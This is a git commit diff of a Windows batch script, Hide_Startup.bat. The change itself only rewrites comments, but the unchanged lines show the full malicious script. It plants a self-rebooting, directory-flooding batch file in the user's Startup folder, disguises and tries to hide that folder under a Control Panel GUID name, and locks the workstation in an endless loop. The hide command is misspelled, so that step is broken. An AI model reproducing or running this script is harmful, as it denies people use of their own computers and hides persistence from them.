8046d43c03ef49e58b4cc24731997e32de6d216d
Chaos <104652517+Chaos142@users.noreply.github.com>
2022-11-04 08:24:13 -0400

    fixes

--- Hide_Startup.bat
+++ Hide_Startup.bat
@@ -1,4 +1,4 @@
-REM Creating a file with code
+::Creating a file with code
 (
 echo shutdown /r /t 5
 echo set /a num=1
@@ -9,14 +9,14 @@ echo md LLLL_%%num%%
 echo num=%%num%%+1
 echo goto a
 ) > File.bat
-REM Copying it to startup and then deleting the original
+::Copying it to startup and then deleting the original
 COPY "File.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 del File.bat /q
 REM renaming the Startup folder to a control panel name and then hide it and set it to a system file
 cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
 ren Startup "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 atrrib +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
-REM Locking the user out until they reboot which is when the startup folder activates with the file created above in it
+::Locking the user out until they reboot which is when the startup folder activates with the file created above in it
 :Lock
 rundll32.exe user32.dll, LockWorkStation
 goto Lock
